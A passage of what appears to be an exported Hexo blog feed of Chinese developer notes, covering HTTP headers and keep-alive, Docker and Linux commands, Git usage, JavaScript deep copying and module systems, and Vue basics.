服务端返回Content Content-Type 对应 Accept，从 Accept 中选择数据类型返回; Content-Encoding 对应 Accept-Encoding，声明服务端数据压缩的方式; 12345678910const zlib = require(&apos;zlib&apos;) // 引入包const html = fs.readFileSync(&apos;test.html&apos;) // 这里不加 utf8，加了返回的就是字符串格式了response.writeHead(200, &#123; &apos;Content-Type&apos;: &apos;text/html&apos;, &apos;Content-Encoding&apos;: &apos;gzip&apos;&#125;)response.end(zlib.gzipSync(html)) Content-Language 对应 Accept-Language，是否根据请求返回语言。 HTTP长连接 Connection HTTP 的请求是在 TCP 连接的基础上发送的，而 TCP链接分为长连接和短连接 。插件控制台network，name那一行，右键选中 connection ID，代表tcp连接的 id。短连接：若关闭 TCP 连接，下次请求需要重新创建，这时会有网络延迟的开销，好处是每次请求完关闭 TCP 连接，减少客户端和服务端连接的并发数。长连接：HTTP 发送请求时，要先创建一个 TCP 连接，并在 TCP 连接上把 HTTP 请求的内容发送并且接收完返回，这是一次请求完成，浏览器与服务器进行协商是否关闭 TCP 链接，若不关闭 TCP 连接会有一定的消耗，好处是如果还有请求可以直接在这个 TCP 连接上发送，不需要经过创建时三次握手的消耗。默认开启长连接，都是合理利用 Connection:‘keep-alive’，并设置一个自动关闭时间，在服务端进行控制通过设置 ‘Connection’: ‘close’ 来关闭默认的长连接.HTTP 2 信道复用, 在 TCP 连接上可以并发的发送 HTTP 请求，意味着链接网站是只需要一个 TCP 连接。google.com的页面都是用的 HTTP2。它的 connection id 都是一个，注意，同域 id 才相同，不同域需要创建 tcp 连接，这样降低了开销，速度有质的提升。]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker]]></title>
    <url>%2F2019%2F01%2F27%2FPython%2Fdocker%2F</url>
    <content type="text"><![CDATA[dockerDocker is a platform for developers and sysadmins to develop, deploy, and run applications with containers. The use of Linux containers to deploy applications is called containerization. Containers are not new, but their use for easily deploying applications is.Docker provides a way to run applications securely isolated in a container, packaged with all its dependencies and libraries.Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 docker pull 获取imagedocker build 创建imagedocker image 查看所有镜像docker run 运行containerdocker ps 查看运行中的docker进程docker rm 删除containerdocker rmi 删除imagedocker cp 在host和container之间拷贝文件docker commit 保存改动为新的image]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Error]]></title>
    <url>%2F2019%2F01%2F27%2FJS%2FError%2F</url>
    <content type="text"><![CDATA[ErrorJavaScript中，Error是一个构造函数，通过它创建一个错误对象。当运行时错误产生时，Error的实例对象会被抛出。构造一个Error的语法如下：new Error([message[, fileName[, lineNumber]]]) Error的种类除了通用的Error构造函数外，JavaScript还有7个其他类型的错误构造函数。InternalError: 创建一个代表Javascript引擎内部错误的异常抛出的实例。 如: “递归太多”。非ECMAScript标准。RangeError: 数值变量或参数超出其有效范围。例子：var a = new Array(-1);EvalError: 与eval()相关的错误。eval()本身没有正确执行。ReferenceError: 引用错误。 例子：console.log(b);SyntaxError: 语法错误。例子：var a = ;TypeError: 变量或参数不属于有效范围。例子：[1,2].split(‘.’)URIError: 给 encodeURI或 decodeURl()传递的参数无效。例子：decodeURI(‘%2’)当JavaScript运行过程中出错时，会抛出上8种(上述7种加上通用错误类型)错误中的其中一种错误。错误类型可以通过error.name拿到。 捕获错误try…catch…, 不能捕获异步代码中的错误,比较耗费性能，兜底处理window.onerror = function(message, source, lineno, colno, error) { … }, 事件监听器,只能声明一次，后续声明会覆盖之前window.addEventListener(‘error’, function(event) { … }), 事件处理器,可以绑定多个回调函数, 也适用于资源( 或 )加载失败时 上报错误最常见、最简单的方式就是通过了。代码简单，且没有跨域烦恼。function logError(error){ var img = new Image(); img.onload = img.onerror = function(){ img = null; } img.src = ${上报地址}?${processErrorParam(error)};} 当上报数据比较多时，可以使用post的方式进行上报。]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大牛博客]]></title>
    <url>%2F2019%2F01%2F27%2FCollection%2F%E5%A4%A7%E7%89%9B%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[一、Node Microsoft/nodejs-guidelineshttps://github.com/Microsoft/nodejs-guidelines/blob/master/getting-started.md 狼叔：如何正确的学习Node.jshttps://github.com/i5ting/How-to-learn-node-correctly 一张图彻底搞懂JavaScript的==运算https://zhuanlan.zhihu.com/p/21650547 if、==、=== 运算结果表https://dorey.github.io/JavaScript-Equality-Table/]]></content>
      <categories>
        <category>Collection</category>
      </categories>
      <tags>
        <tag>Collection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux]]></title>
    <url>%2F2019%2F01%2F27%2FCS%2FLinux%2F</url>
    <content type="text"><![CDATA[// 查看端口占用lsof -i:443 // -t (tcp), -u (udp), -n 拒绝显示别名，能显示数字的全部转化为数字, -l 仅列出在Listen(监听)的服务状态, -p 显示建立相关链接的程序名netstat -tunlp | grep 8000 // chomd 文件权限// 分别表示User、Group、及Other的权限, r=4，w=2，x=1sudo chmod 761 file linux 安装node1234567891011121314151617181920查看 ls -la下载安装包到服务器， 如用 wget (或者ssh/ftp)wget https://nodejs.org/dist/v10.14.1/node-v10.14.1-linux-x64.tar.xz 解压xz文件xz -d node-v10.14.1-linux-x64.tar.xz (解压缩，然后压缩包消失)解压tar文件tar -xvf node-v10.14.1-linux-x64.tar创建软连接 ln -s source object ln -s /node-v10.14.1-linux-x64/bin/node /usr/bin/nodeln -s /node-v10.14.1-linux-x64/bin/npm /usr/bin/npm删除软链接rm -rf /usr/bin/node (不是node/)检验查看版本node -vnpm -v]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅拷贝(Shallow Copy) VS 深拷贝(Deep Copy)]]></title>
    <url>%2F2019%2F01%2F27%2FJS%2F%E6%B5%85%E6%8B%B7%E8%B4%9D%E3%80%81%E6%B7%B1%E6%8B%B7%E8%B4%9D%2F</url>
    <content type="text"><![CDATA[在 JS 中有一些基本类型像是Number、String、Boolean，而对象就是像这样的东西{ name: ‘sea’, skill: ‘Node’ }，对象跟基本类型最大的不同就在于他们的传值方式。基本类型是按值传递，在修改a时并不会改到b。 var a = 25;var b = a;b = 18;console.log(a); //25console.log(b); //18 // 但对象就不同，对象传的是按引用传值，var obj1 = { a: 10, b: 20, c: 30 };var obj2 = obj1;obj2.b = 100;console.log(obj1); // { a: 10, b: 100, c: 30 } &lt;– b 被改到了console.log(obj2); // { a: 10, b: 100, c: 30 }// 复制一份obj1叫做obj2，然后把obj2.b改成100，但却不小心改到obj1.b，因为他们根本是同一个对象，// 这就是所谓的浅拷贝。 // 要避免这样的错误发生就要写成这样：var obj1 = { a: 10, b: 20, c: 30 };var obj2 = { a: obj1.a, b: obj1.b, c: obj1.c };obj2.b = 100;console.log(obj1); // { a: 10, b: 20, c: 30 } &lt;– b 沒被改到console.log(obj2); // { a: 10, b: 100, c: 30 }// 这样就是深拷贝，不会改到原本的obj1。 // 浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。// 但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。 // 浅拷贝的实现方式// 1、简单地复制语句function simpleClone(initalObj) { var obj = {}; for ( var i in initalObj) { obj[i] = initalObj[i]; } return obj;} // 2、Object.assign()// 该方法可以把任意多个的源对象自身的可枚举属性拷贝给目标对象，然后返回目标对象。但是进行的是浅拷贝，拷贝的是对象的属性的引用，而不是对象本身。Object.assign(target, …sources) // 深拷贝的实现方式// 1、手动复制， 把一个对象的属性复制给另一个对象的属性， 但这样很麻烦，而且这样的本质也不能算是 Deep Copy，因为对象里面也可能会是对象var obj1 = { a: 10, b: 20, c: 30 };var obj2 = { a: obj1.a, b: obj1.b, c: obj1.c }; // 2、：Object.assign({}, obj1)， 对象只有一层时var obj2 = Object.assign({}, obj1)// 先建立一个空对象{}，接着把obj1中所有的属性复制过去，所以obj2会长得跟obj1一样，这时候再修改obj2.b也不会影响obj1。// 因为Object.assign跟我们手动复制的效果相同，所以一样只能处理深度只有一层的对象，没办法做到真正的 Deep Copy。 // 3、JSON.parse(JSON.stringify(obj))， 只能用在单纯只有数据的对象var obj2 = JSON.parse(JSON.stringify(obj));// 用JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象。这样做是真正的Deep Copy，这种方法简单易用。// 但是这种方法也有不少坏处，譬如它会抛弃对象的constructor。也就是深拷贝之后，不管这个对象原来的构造函数是什么，在深拷贝之后都会变成Object。// 这种方法能正确处理的对象只有 Number, String, Boolean, Array, 扁平对象，即那些能够被 json 直接表示的数据结构。RegExp对象是无法通过这种方式深拷贝。// 也就是说，只有可以转成JSON格式的对象才可以这样用，像function没办法转成JSON。 原理: 利用JSON.stringify() 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象。序列化的作用是存储(对象本身存储的只是一个地址映射，如果断电，对象将不复存在，因此需将对象的内容转换成字符串的形式再保存在磁盘上 )和传输（例如 如果请求的Content-Type是 application/x-www-form-urlencoded，则前端这边需要使用qs.stringify(data)来序列化参数再传给后端，否则后端接受不到；Content-Type 为 application/json;charset=UTF-8或者 multipart/form-data 则可以不需要）。在使用 JSON.parse(JSON.stringify(obj))时应该注意一下几点：如果obj里面有时间对象，则JSON.stringify后再JSON.parse的结果，时间将只是字符串的形式。而不是时间对象；如果obj里有RegExp、Error对象，则序列化的结果将只得到空对象;如果obj里有函数，undefined，则序列化的结果会把函数或 undefined丢失；如果obj里有NaN、Infinity和-Infinity，则序列化的结果会变成null;JSON.stringify()只能序列化对象的可枚举的自有属性，如果obj中的对象是有构造函数生成的，深拷贝后，会丢弃对象的constructor；如果对象中存在循环引用的情况也无法正确实现深拷贝。 // 4、递归拷贝function deepClone(initalObj, finalObj) { var obj = finalObj || {}; for (var i in initalObj) { var prop = initalObj[i]; // 避免相互引用对象导致死循环，如initalObj.a = initalObj的情况 if(prop === obj) { continue; } if (typeof prop === ‘object’) { obj[i] = (prop.constructor === Array) ? [] : {}; arguments.callee(prop, obj[i]); } else { obj[i] = prop; } } return obj;} // 5、使用Object.create()方法var newObj = Object.create(oldObj) function deepClone(initalObj, finalObj) { var obj = finalObj || {}; for (var i in initalObj) { var prop = initalObj[i]; // 避免相互引用对象导致死循环，如initalObj.a = initalObj的情况 if(prop === obj) { continue; } if (typeof prop === ‘object’) { obj[i] = (prop.constructor === Array) ? [] : Object.create(prop); } else { obj[i] = prop; } } return obj;} // 6、lodashvar obj2 = _.cloneDeep(obj1); // 7、jquery, 有提供一个$.extend可以用来做 Deep Copy。var obj2 = $.extend(true, {}, obj1);]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AMD、CMD、UMD、CommonJS 和 ES6 对比]]></title>
    <url>%2F2019%2F01%2F27%2FJS%2FAMD%E3%80%81CMD%E3%80%81CommonJS%2F</url>
    <content type="text"><![CDATA[AMD、CMD、UMD、CommonJS 和 ES6 对比 AMD: Asynchronous Module Definition 异步模块定义。预先加载，依赖前置。 RequireJS 在推广过程中对模块定义的规范化产出。使用了异步加载和回调的方式，模块的加载不影响它后面语句的运行，优先照顾浏览器的模块加载场景。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行，即依赖前置。提供定义模块及异步加载该模块依赖的机制，通过define方法去定义模块 define(id?, dependencies?factory)，require方法去加载模块。 12345 define(['./a', './b'], function(a, b) &#123; //依赖必须一开始就写好，a.js和b.js已经下载完成 a模块和b模块已经执行完，直接可用； a.doing() // blabla... b.doing()&#125;) CMD: Common Module Definition 通用模块定义。按需加载，依赖就近。 SeaJS 在推广过程中对模块定义的规范化产出。提供模块定义及按需执行模块。 AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同(都是异步加载模块)。 1234567define(function(require, exports, module) &#123; var a = require("./a"); //等待a.js下载、执行完 a.doing() // blabla... var b = require("./b"); //依赖就近书写 b.doing()&#125;) CommonJS 服务器端模块的规范，由Node推广使用。一个单独的文件就是一个模块。每一个模块都是一个单独的作用域，也就是说，在该模块内部定义的变量，无法被其他模块读取，除非定义为global对象的属性； 输出模块变量的最好方法是使用module.exports对象； 加载模块使用require方法，该方法读取一个文件并执行，返回文件内部的module.exports对象。对于基本数据类型，属于复制。即会被模块缓存。同时，在另一个模块可以对该模块输出的变量重新赋值。对于复杂数据类型，属于浅拷贝。由于两个模块引用的对象指向同一个内存空间，因此对该模块的值做修改时会影响另一个模块。当使用require命令加载某个模块时，就会运行整个模块的代码。当使用require命令加载同一个模块时，不会再执行该模块，而是取到缓存之中的值。也就是说，CommonJS模块无论加载多少次，都只会在第一次加载时运行一次，以后再加载，就返回第一次运行的结果，除非手动清除系统缓存。循环加载时，属于加载时执行。即脚本代码在require的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。 UMD（Universal Module Definition）提供了支持多种风格的“通用”模式，在兼容CommonJS和AMD规范的同时，还兼容全局引用的方式。UMD实现原理很简单：先判断是否支持AMD（define 是否存在），存在则使用 AMD 方式加载模块；再判断是否支持 Node.js 模块格式（exports是否存在），存在则使用 Node.js 模块格式；前两个都不存在，则将模块公开到全局（window 或 global）。UMD 使得你可以直接使用 script 标签引用。 ES6 export/import分别导出、引入模块。ES6模块与CommonJS模块的差异: CommonJS模块输出的是一个值的拷贝，一旦输出一个值，会被缓存，模块内部的变化就影响不到这个值，CommonJS模块是运行时加载，ES6模块是编译时输出接口;ES6 模块是动态引用，ES6模块输出的是值的引用，并且不会缓存值，模块里面的变量绑定其所在的模块。export通过接口，输出的是同一个值，不同的脚本加载这个接口，得到的都是同样的实例。这个变量是只读的，对它进行重新赋值会报错。ES6模块中的值属于【动态只读引用】。对于只读来说，即不允许修改引入变量的值，import的变量是只读的，不论是基本数据类型还是复杂数据类型。当模块遇到import命令时，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。对于动态来说，原始值发生变化，import加载的值也会发生变化。不论是基本数据类型还是复杂数据类型。循环加载时，ES6模块是动态引用。只要两个模块之间存在某个引用，代码就能够执行。]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用的Git命令]]></title>
    <url>%2F2019%2F01%2F27%2FTools%2FGit%2F</url>
    <content type="text"><![CDATA[新建代码库 git init 在当前目录新建一个git代码库 git clone [url] 下载一个项目和它的整个代码历史 git clone git@github.com:Supremeyh/Supremeyh.github.io.git 不指定分支 git clone -b sea git@github.com:Supremeyh/Supremeyh.github.io.git 指定分支 配置信息 git config –list 显示当前的git配置 git config [–global] user.name “[name]” 设置提交代码时的用户名 git config [–global] user.email “[email address]” 设置提交代码时的用户邮箱 查看信息 git status 显示有变更的文件 git log 显示当前分支的版本历史 git log –stat 显示commit历史，以及每次commit发生变更的文件 git log -S [keyword] 搜索提交历史，根据关键词 git log –follow [file] 显示某个文件的版本历史，包括文件改名 eg: git log –follow package.json git whatchanged [file] 显示某个文件的版本历史，包括文件改名 git log -p [file] 显示指定文件相关的每一次diff git log -5 –pretty –oneline 显示过去5次提交 git shortlog -sn 显示所有提交过的用户，按提交次数排序 git blame [file] 显示指定文件是什么人在什么时间修改过 git diff 显示暂存区和工作区的差异 git reflog 显示当前分支的最近几次提交 git diff –shortstat “@{0 day ago}” 显示今天你写了多少行代码 分支 git branch 列出所有本地分支 git branch -r 列出所有远程分支 git branch -a 列出所有本地、远程分支 git branch sea 新建一个分支，但依然停留在当前分支 git checkout -b sea 新建一个分支，并切换到该分支 git checkout sea 换到指定分支，并更新工作区 git checkout - 切换到上一个分支 git merge sea 合并指定分支到当前分支 删除分支 git branch -d dev 删除本地分支 git push origin -d dev 删除远程分支 git push origin :dev 删除远程分支(推送一个空tag到远程tag) git branch | grep ‘branchName’ | xargs git branch -D 批量删除分支 标签 git tag 列出所有tag git show [tag] 查看指定tag信息, eg: git show v1.0 git tag [tag] 新建一个tag在当前commit git tag -a v1.0 -m ‘first version’ // 创建tag git tag [tag] [commit] 新建一个tag在指定commit git tag -d [tag] 删除本地tag git push origin :refs/tags/[tagName] 删除远程tag git push origin -d tag tagName 删除远程tag git push [remote] [tag] 提交指定tag, eg: git push origin v1.0 git push [remote] –tags 提交所有tag, eg: git push origin –tags 远程同步 git remote -v 显示所有远程仓库 git remote show [remote] 显示某个远程仓库的信息 git remote add origin [url] 增加一个新的远程仓库，并命名 git remote set-url origin [updated link] 设置远程仓库地址 git remote rm origin 删除远程仓库地址 git fetch [remote] 下载远程仓库的所有变动 git pull [remote] [branch] 取回远程仓库的变化，并与本地分支合并 git pull origin dev:sea 取回远程origin主机dev分支与本地sea分支合并 git push [remote] [branch] 上传本地指定分支到远程仓库 git push [remote] –force 强行推送当前分支到远程仓库，即使有冲突 git push [remote] –all 推送所有分支到远程仓库 同步upstream 原始仓库 git clone git@github.com:Supremeyh/blog.git clone自己代码origin到本地 git checkout -b dev 新建分支 git remote -v git remote add upstream git@github.com:Supremeyh/blog.git 配置原始仓库 git fetch upstream 获取原始仓库分支和对应的提交，分支dev的提交会保存到本地分支，upstream/dev git rebase upstream/dev 要经常与主干保持同步 git rebase -i upstream/dev 合并commit git checkout dev 切换到fork仓库本地的dev分支 git merge upstream/dev 把原始upstream/dev的改变合并到本地的dev分支 git push 推送自己的本地仓库到自己的origin远程仓库 发出Pull Request 放弃本地修改，代码强制拉取更新 git fetch –all git reset –hard origin/master git pull //可以省略 撤销 commit git log 找到你想撤销的commit_id git reset HEAD^ 不删除工作空间改动代码，撤销commit，并且撤销git add . git reset –soft HEAD^ 不删除工作空间改动代码，撤销commit,不撤销git add，尝试回退一个版本 git reset –hard HEAD~2 尝试回退两个版本 git reset –hard [commit_id] 完成撤销,同时将代码恢复到前一commit_id 对应的版本 git reset [commit_id] 完成Commit命令的撤销，但是不对代码修改进行撤销 git commit –amend 若commit注释写错了，只是想改一下注释，进入默认vim编辑器，修改注释完毕后保存即可 注: git reset HEAD^–mixed，默认参数，等同于 git reset –mixed HEAD^–soft， 不删除工作空间改动代码，撤销commit，不撤销git add .–hard， 删除工作空间改动代码，撤销commit，撤销git add . 。完成这个操作后，就恢复到了上一次的commit状态 HEAD^指上一个版本，也即HEAD~1 撤销 push到远端后的操作 git log remotes/origin/分支名 查看版本号 git reset –hard &lt;需要回退到的版本号（只需输入前几位）&gt; 先在本地回退到需要的版本, 本地不需要回退可略过 git push origin branchName –force 提交到远端 暂存 git stash ‘some message’ 将撤销的代码暂存起来。 暂时将未提交的变化移除，稍后再移入 git stash pop 重新应用缓存 FQA.gitignore不生效 git rm -r –cached . //清空缓存 Permission denied (publickey). cd ~/.ssh ls 来查看是否有文件id_rsa以及文件id_rsa.pub ssh-keygen -t rsa -C “supremeyh@126.com“ 生成ssh key ssh -v git@github.com ssh-agent -s ssh-add ~/.ssh/id_rsa cat id_rsa.pub 拷贝内容到github，在settings下，SSH and GPG keys下new SSH key的key 中保存 ssh -T git@github.com 验证key 将本地的分支与远程仓库的分支进行关联 The branch ‘master’ has no upstream branch.Would you like to publish this branch ？ 在vscode 通过 push 快捷操作时，出现弹框提示。问题的原因是没有将本地的分支与远程仓库的分支进行关联。出现这种情况主要是由于远程仓库太多，且分支较多。在默认情况下，git push时一般会上传到origin下的master分支上，然而当repository和branch过多，而又没有设置关联时，git就会产生疑问，因为它无法判断你的push目标。 git branch -a 查看所有分支 方法一 git push –set-upstream origin master 保证你的远程分支存在，如果不存在，也就无法进行关联方法二（推荐） git push -u origin master 即使远程没有你要关联的分支，它也会自动创建一个出来，以实现关联 插件 Octotree 侧栏目录树形]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo个性化NexT]]></title>
    <url>%2F2019%2F01%2F26%2FTools%2FHexo%E4%B8%AA%E6%80%A7%E5%8C%96NexT-md%2F</url>
    <content type="text"><![CDATA[常见问题 部署到Github Pages 打开categories出现 404原因：文件夹大小写问题导致的，生成Category文件夹时大写，之后改成小了写。git 默认忽略文件名大小写，所以即使文件夹大小写变更，git 也检测不到。方案：1、进入到博客项目中 .deploy_git文件夹，修改 .git 下的 config 文件，将 ignorecase=true 改为 ignorecase=false。 2、删除博客项目中 .deploy_git 文件夹下的所有文件，并 push 到 Github 上, 这一步是清空你的 github.io 项目中所有文件。3、重新生成部署 hexo g -d 打开博客很慢原因：加载fonts.googleapis.com字体库导致方案：在NexT主题的_config.yml里面的host: 改为host: //fonts.lug.ustc.edu.cn 。 (中科大的源) 设置内容隐藏不显示post 头部标识 hide: true 修改主题配置项123456789101112// Hexo\themes\next\layout\index.swig&#123;% block content %&#125; &lt;section id="posts" class="posts-expand"&gt; &#123;% for post in page.posts %&#125; &#123;% if post.hide != true %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/section&gt; &#123;% include '_partials/pagination.swig' %&#125;&#123;% endblock %&#125;]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown语法]]></title>
    <url>%2F2019%2F01%2F23%2FTools%2Fmarkdown%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[markdown教程]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue常踩的坑 Trampling Pits]]></title>
    <url>%2F2019%2F01%2F23%2FVue%2Fvue%E5%B8%B8%E8%B8%A9%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[小程序 import 不能使用绝对路径，只能使用相对路径。但components内可以。如import { config } from ‘../config.js’ thirdScriptError: code.startsWith is not a function，(定位代码，查看文档是否支持ES6)，说明code不是字符串，先用toString()处理下。如果是报undefied，说明code不存在。 不要在选项属性或回调上使用箭头函数，比如 created: () =&gt; console.log(this.a) 或 vm.$watch(‘a’, newValue =&gt; this.myMethod())。因为箭头函数是和父级上下文绑定在一起的，this 不会是如你所预期的 Vue 实例，经常导致 Uncaught TypeError: Cannot read property of undefined 或 Uncaught TypeError: this.myMethod is not a function 之类的错误。 tinymce tinymce解决上传的图片是相对路径问题由于编辑的文章，可能会出现在app或者小程序中，这时候要求富文本中的图片是绝对路径，而不是相对路径。需要设置：relative_urls : false,remove_script_host : false]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生命周期]]></title>
    <url>%2F2019%2F01%2F23%2FVue%2F%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue基础]]></title>
    <url>%2F2019%2F01%2F23%2FVue%2Fvue%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[计算属性 computed对于任何复杂逻辑，都应当使用计算属性。计算属性缓存 vs 方法： 计算属性是基于它们的依赖进行缓存的，减小性能开销。只在相关依赖发生改变时它们才会重新求值，相比之下，调用方法将总会再次执行函数。计算属性 vs 侦听属性：侦听器watch是一种更通用的方式来观察和响应实例上的数据变动，当需要在数据变化时执行异步或开销较大的操作时，这个方式是最有用的。使用 watch 选项允许我们执行异步操作 (访问一个 API)，限制我们执行该操作的频率，并在我们得到最终结果前，设置中间状态。 当你有一些数据需要随着其它数据变动而变动时，你很容易滥用 watch。然而，通常更好的做法是使用计算属性。watch里面监听了data里面的单一变量的变化，而computed可以监听多个本vue实例里面data变量的变化。 条件渲染 v-if v-if vs v-show。v-if 是“真正”的条件渲染，会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建;也是惰性的，如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。因此，有更高的切换开销。 v-show 始终会被渲染并保留在 DOM 中。v-show 只是简单地切换元素的 CSS 属性 display。 v-if 与 v-for 一起使用。当处于同一节点，v-for 具有比 v-if 更高的优先级，这意味着 v-if 将分别重复运行于每个 v-for 循环中。为了过滤一个列表中的项目 (比如 v-for=”user in users” v-if=”user.isActive”)，应将 users 替换为一个计算属性 (比如 activeUsers)，让其返回过滤后的列表。为了避免渲染本应该被隐藏的列表 (比如 v-for=”user in users” v-if=”shouldShowUsers”)。这种情形下，请将 v-if 移动至容器元素上 (比如 ul, ol)。 列表渲染 v-for v-for=”(value, key, index) in object” 分别为 值，键，索引。在遍历对象时，是按 Object.keys() 的结果遍历，但是不能保证它的结果在不同的 JavaScript 引擎下是一致的。 数组更新检测 变异方法，会触发视图更新：push()、pop()、shift()、unshift()、splice()、sort()、reverse()非变异方法，不会改变原始数组，总是返回一个新数组：filter()、concat()、slice() 。当使用非变异方法时，可以用新数组替换旧数组。由于 JavaScript 的限制，Vue 不能检测以下变动的数组，不能触发状态更新：1、利用索引直接设置一个项时，例如：vm.items[indexOfItem] = newValue，可以使用 Vue.set (即vm.$set): Vue.set(vm.items, indexOfItem, newValue)也可以使用 Array.prototype.splice: vm.items.splice(indexOfItem, 1, newValue)2、修改数组的长度时，例如：vm.items.length = newLength可以使用 vm.items.splice(newLength)由于 JavaScript 的限制，Vue 不能检测对象属性的添加或删除：对于已经创建的实例，Vue 不能动态添加根级别的响应式属性。但是,可以使用 Vue.set(object, key, value) 方法向嵌套对象添加响应式属性.也可以使用 Object.assign()两个对象的属性创建一个新的对象 或 _.extend(): vm.Bob = Object.assign({}, vm.Bob, {age:27,sex:’boy’}) 显示过滤/排序结果要显示一个数组的过滤或排序副本，而不实际改变或重置原始数据，可以创建返回过滤或排序数组的计算属性。v-for=”n in evenNumbers”；在计算属性不适用的情况下 (例如，在嵌套 v-for 循环中) 你可以使用一个 method 方法：v-for=”n in even(numbers)” . 一段取值范围的 v-forv-for 也可以取整数。在这种情况下，它将重复多次模板。v-for=”n in 10” 为1,2…10 vue选中某一项 123&lt;div v-for= "(item, index) in List"&gt; &lt;p :class="&#123;'current': currentChecked===index&#125;" @click="currentChecked=index"&gt;&lt;/p&gt;&lt;/div&gt; 事件处理 event 在内联语句处理器中访问原始的 DOM 事件,可以用特殊变量 $event 把它传入方法 @click=”showMsg($event)” 事件修饰符.stop 阻止单击事件继续传播，相当于event.stopPropagation() 阻止事件冒泡.prevent 取消默认行为，相当于event.preventDefault(). 如@submit.prevent 提交事件不再重载页面.capture 使用事件捕获模式, 即元素自身触发的事件先在此处理，然后才交由内部元素进行处理.self 只当在 event.target 是当前元素自身时触发处理函数,即事件不是从内部子元素触发的.once：只触发一次.passive 不阻止事件的默认行为,用于scoll、touchmove性能优化,修饰符可以串联: @click.stop.prevent.使用修饰符时，顺序很重要,相应的代码会以同样的顺序产生:@click.prevent.self 会阻止所有的点击@click.self.prevent 只会阻止对元素自身的点击@scroll.passive 滚动事件的默认行为 (即滚动行为) 将会立即触发,而不会等待 onScroll 完成。该修饰符尤其能够提升移动端的性能。.passive和.prevent 不能一起使用。.passive 会告诉浏览器你不想阻止事件的默认行为。.prevent 将会被忽略，同时浏览器可能会一个警告。v-on 事件监听器在 DOM 模板中会被自动转换为全小写 (因为 HTML 是大小写不敏感的)，所以 v-on:myEvent 将会变成 v-on:myevent——导致 myEvent 不可能被监听到。因此，推荐始终使用 kebab-case 的事件名。 按键修饰符@keyup.13 在 keyCode 是 13 时调用按键别名: .enter、.tab、.delete (捕获“删除”和“退格”键)、.esc、.space、.up、.down、.left、.right。通过全局 config.keyCodes 对象自定义按键修饰符别名, 如Vue.config.keyCodes.f1 = 112，之后可以使用 @keyup.f1 有一些按键 (.esc 以及所有的方向键) 在 IE9 中有不同的 key 值, 如果你想支持 IE9，它们的内置别名应该是首选。 系统修饰键.ctrl、.alt、.shift、.meta，可以用这些修饰符来实现仅在按下相应按键时才触发鼠标或键盘事件的监听器。请注意修饰键与常规按键不同，在和 keyup 事件一起用时，事件触发时修饰键必须处于按下状态。换句话说，只有在按住 ctrl 的情况下释放其它按键，才能触发 keyup.ctrl。如果你想要这样的行为，请为 ctrl 换用 keyCode：keyup.17。 .exact 修饰符允许你控制由精确的系统修饰符组合触发的事件。如@click.ctrl.exact有且只有 Ctrl 被按下的时候才触发 鼠标按钮修饰符.left、.right、.middle，这些修饰符会限制处理函数仅响应特定的鼠标按钮。 组件基础 component 父子组件间通信父组件通过 prop 给子组件下发数据，子组件通过$emit触发事件给父组件发送消息，即 prop 向下传递，事件向上传递。props down, events up. 通过事件向父级组件发送消息, 子组件调用$emit方法，向父级组件触发一个事件，如 @click=”$emit(‘boder-larger’, 2)； 父组件监听事件这个事件，就像监听一个原生 DOM 事件一样，如 @boder-larger=”postBorderSize += $event”。如果这个事件处理函数是一个方法，那么这个值将会作为第一个参数传入这个方法 onLargerFontSize(playload) 